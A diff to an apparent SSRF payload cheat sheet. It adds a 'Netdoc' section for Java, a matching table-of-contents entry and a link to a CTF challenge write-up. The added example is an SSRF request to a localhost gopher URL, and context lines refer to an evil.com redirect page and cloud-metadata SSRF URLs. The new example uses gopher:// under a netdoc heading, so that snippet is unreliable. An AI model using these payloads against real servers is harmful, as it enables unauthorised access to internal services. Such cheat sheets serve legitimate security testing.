@@ -28,6 +28,7 @@
   * [tftp://](#tftp)
   * [ldap://](#ldap)
   * [gopher://](#gopher)
+  * [netdoc://](#netdoc)
 * [SSRF to XSS](#ssrf-to-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
@@ -345,6 +346,14 @@ Content of evil.com/redirect.php:
 ?>
 ```
 
+### Netdoc
+
+Wrapper for Java when your payloads struggle with "\n" and "\r" characters.
+
+```powershell
+ssrf.php?url=gopher://127.0.0.1:4242/DATA
+```
+
 ## SSRF to XSS 
 
 by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
@@ -658,3 +667,4 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [PortSwigger - Web Security Academy Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
 - [SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019](https://github.com/allanlw/svg-cheatsheet)
 - [SSRF’s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019](https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)
+- [challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE!](https://www.kieranclaessens.be/cscbe-web-2018.html)
